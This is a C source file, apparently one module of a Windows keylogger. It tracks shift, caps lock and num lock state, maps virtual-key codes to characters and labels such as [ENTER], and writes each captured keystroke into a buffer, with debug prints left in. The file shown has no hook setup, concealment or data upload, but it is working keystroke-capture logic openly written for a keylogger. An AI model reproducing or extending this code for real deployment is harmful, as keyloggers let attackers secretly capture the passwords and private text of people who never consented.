
#include <stdio.h>

#include "keyloggerstate.h"

KEY_LOGGER_STATE* initKeyLogger() {
    KEY_LOGGER_STATE* klState = malloc(sizeof(KEY_LOGGER_STATE));
    if (klState == NULL) return NULL;

    klState->shift = FALSE;
    klState->capsLock = FALSE;
    klState->numPad = FALSE;
    klState->buffPtr = 0;  // set the buffer pointer to the start
    // set all the keycodes
    for (int i = 0; i < NUM_KEYS; i++) 
        klState->keyCodes[i] = NULL;
    
    initKeyCodes(klState);
    return klState;
}

/**
 * simply go through and cleanup each key pair struct before freeing
 * the keylogger itself
 */
void keyLoggerCleanup(KEY_LOGGER_STATE* klState) {
    for (int i = 0; i < NUM_KEYS; i++)
        cleanupKeyPair(klState->keyCodes[i]); // free key pair structs
    free(klState);
}

/**
 * update the state of the boolean keys flags. If shift is down then set it to true, 
 * otherwise set to false. If caps lock or numpad has been pressed then simply 
 * swap the flags 
 */
BOOL updateKeyLoggerState(KEY_LOGGER_STATE* klState, WPARAM wParam, LPDWORD vkCode) {
    // shift has been pressed so update it
    if (*vkCode == VK_SHIFT || *vkCode == VK_LSHIFT || *vkCode == VK_RSHIFT) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            klState->shift = TRUE;  // if its key-down shift state it true 
        else
            klState->shift = FALSE; // on release set to false
        return TRUE;
    }
    // if its not key down we don't need to check, we now only 
    // care for key down capslock and numlock
    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        return FALSE;
    
    if (*vkCode == VK_CAPITAL) {
        swapBOOL(&klState->capsLock);
        return TRUE;
    }
    if (*vkCode == VK_NUMLOCK) {
        swapBOOL(&klState->numPad);
        return TRUE;
    }
    return FALSE;
}

ERR_CODE addKeyToBuffer(KEY_LOGGER_STATE* klState, LPDWORD vkCode) {
    KEY_PAIR* kp = klState->keyCodes[*vkCode];
    
    if (kp == NULL) return ECODE_NULL;
    if (klState->buffPtr == MAX_BUFF_LEN - 1) return ECODE_FULL_BUFF;

    // if the key is unprintable then it should be appended to the buffer immediately
    if (isKeyUnprintable(kp)) {
        ERR_CODE ret = writeStrToBuffer(klState, kp->unprintableKeyStr);
        return ret;
    }
    
    // otherwise simply retrieve the char pressed and return
    char ch = getKeyChar(klState, kp, vkCode);
    klState->keyBuffer[klState->buffPtr] = ch;
    klState->buffPtr++;
    klState->keyBuffer[klState->buffPtr] = '\0';

    printf("|KL Tesing| %c\n", ch);

    return ECODE_SUCCESS;
}

/**
 * 
 */
char getKeyChar(KEY_LOGGER_STATE* klState, KEY_PAIR* kp, LPDWORD vkCode) {
    // check letters first as a small optimisation
    printf("CAPSTEST: %d\n", klState->capsLock);
    if (*vkCode >= A && *vkCode <= Z) {
        if (klState->capsLock || klState->shift) 
            return kp->onShift;
        return kp->normal;
    }

    // Special case: if numPad is active and VK_NUMPAD0 <= vkCode <= VK_NUMPAD9
    // Special case: if shift flag is set 
    char ch;
    if (klState->numPad && (*vkCode >= VK_NUMPAD0 && *vkCode <= VK_NUMPAD9))
        ch = kp->normal;
    else if (klState->shift)
        ch = kp->onShift;
    else
        ch = kp->normal;
    return ch;
}

/**
 * simply writes the characters from the string represenation of an
 * unprintable key into the key buffer, returing the appropriate code
 */
ERR_CODE writeStrToBuffer(KEY_LOGGER_STATE* klState, char* s) {
    // manually copy the string into the buffer
    char* str = s;
    while (*str != '\0' && klState->buffPtr < MAX_BUFF_LEN - 1) {
        klState->keyBuffer[klState->buffPtr] = *str;
        klState->buffPtr++; str++;
    }
    klState->keyBuffer[klState->buffPtr] = '\0';

    printf("\n|KL Tesing| %s\n", s);

    // if we have hit the end of the buffer say so!
    if (klState->buffPtr == MAX_BUFF_LEN - 1) 
        return ECODE_FULL_BUFF;

    return ECODE_SUCCESS;
}

/**
 * 
 * https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 */
void initKeyCodes(KEY_LOGGER_STATE* klState) {
    // initialise numpad values
    const char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    for (int i = 0; i <= 9; i++)
        klState->keyCodes[i + VK_NUMPAD0] = initKeyPair(digits[i], '\0', NULL);

    // initialise letter array
    for (int upperLetter = A; upperLetter <= Z; upperLetter++) {
        char lowerLetter = upperLetter + 0x20; // get lowercase
        klState->keyCodes[upperLetter] = initKeyPair(lowerLetter, upperLetter, NULL);
    }

    klState->keyCodes[VK_LBUTTON]  = initKeyPair('\0', '\0', "[LMOUSE]");
    klState->keyCodes[VK_RBUTTON]  = initKeyPair('\0', '\0', "[RMOUSE]");
    klState->keyCodes[VK_BACK]     = initKeyPair('\0', '\0', "[BACKSPACE]");
    klState->keyCodes[VK_TAB]      = initKeyPair('\0', '\0', "[TAB]");
    klState->keyCodes[VK_RETURN]   = initKeyPair('\0', '\0', "[ENTER]");
    klState->keyCodes[VK_CONTROL]  = initKeyPair('\0', '\0', "[CTRL]");
    klState->keyCodes[VK_LCONTROL] = klState->keyCodes[VK_CONTROL];
    klState->keyCodes[VK_RCONTROL] = klState->keyCodes[VK_CONTROL];
    klState->keyCodes[VK_MENU]     = initKeyPair('\0', '\0', "[ALT]");
    klState->keyCodes[VK_ESCAPE]   = initKeyPair('\0', '\0', "[ESC]");
    klState->keyCodes[VK_SPACE]    = initKeyPair('\0', '\0', " ");
    klState->keyCodes[VK_PRIOR]    = initKeyPair('\0', '\0', "[PGUP]");
    klState->keyCodes[VK_NEXT]     = initKeyPair('\0', '\0', "[PGDWN]");
    klState->keyCodes[VK_HOME]     = initKeyPair('\0', '\0', "[HOME]");
    klState->keyCodes[VK_LEFT]     = initKeyPair('\0', '\0', "[LEFT]");
    klState->keyCodes[VK_UP]       = initKeyPair('\0', '\0', "[UP]");
    klState->keyCodes[VK_RIGHT]    = initKeyPair('\0', '\0', "[RIGHT]");
    klState->keyCodes[VK_DOWN]     = initKeyPair('\0', '\0', "[DOWN]");
    klState->keyCodes[VK_SNAPSHOT] = initKeyPair('\0', '\0', "[PRSCREEN]");
    klState->keyCodes[VK_INSERT]   = initKeyPair('\0', '\0', "[INSERT]");
    klState->keyCodes[VK_DELETE]   = initKeyPair('\0', '\0', "[DELETE]");
    klState->keyCodes[VK_SLEEP]    = initKeyPair('\0', '\0', "[SLEEP]");
    
    // for these keys the second char is when shift is true, the first is unshift
    // 0x30 = 0, 0x39 = 9
    klState->keyCodes[0x30] = initKeyPair('0', ')', NULL);
    klState->keyCodes[0x31] = initKeyPair('1', '!', NULL);
    klState->keyCodes[0x32] = initKeyPair('2', '@', NULL);
    klState->keyCodes[0x33] = initKeyPair('3', '#', NULL);
    klState->keyCodes[0x34] = initKeyPair('4', '$', NULL);
    klState->keyCodes[0x35] = initKeyPair('5', '%', NULL);
    klState->keyCodes[0x36] = initKeyPair('6', '^', NULL);
    klState->keyCodes[0x37] = initKeyPair('7', '&', NULL);
    klState->keyCodes[0x38] = initKeyPair('8', '*', NULL);
    klState->keyCodes[0x39] = initKeyPair('9', '(', NULL);

    // range is VK_OEM_1 <-> VK_OEM_7
    klState->keyCodes[VK_OEM_1]      = initKeyPair(';', ':', NULL);
    klState->keyCodes[VK_OEM_PLUS]   = initKeyPair('=', '+', NULL);
    klState->keyCodes[VK_OEM_COMMA]  = initKeyPair(',', '<', NULL);
    klState->keyCodes[VK_OEM_MINUS]  = initKeyPair('-', '_', NULL);
    klState->keyCodes[VK_OEM_PERIOD] = initKeyPair('.', '>', NULL);
    klState->keyCodes[VK_OEM_2]      = initKeyPair('/', '?', NULL);
    klState->keyCodes[VK_OEM_3]      = initKeyPair('`', '~', NULL);
    klState->keyCodes[VK_OEM_4]      = initKeyPair('[', '{', NULL);
    klState->keyCodes[VK_OEM_5]      = initKeyPair('\\', '|', NULL);
    klState->keyCodes[VK_OEM_6]      = initKeyPair(']', '}', NULL);
    klState->keyCodes[VK_OEM_7]      = initKeyPair('\'', '"', NULL);   
}

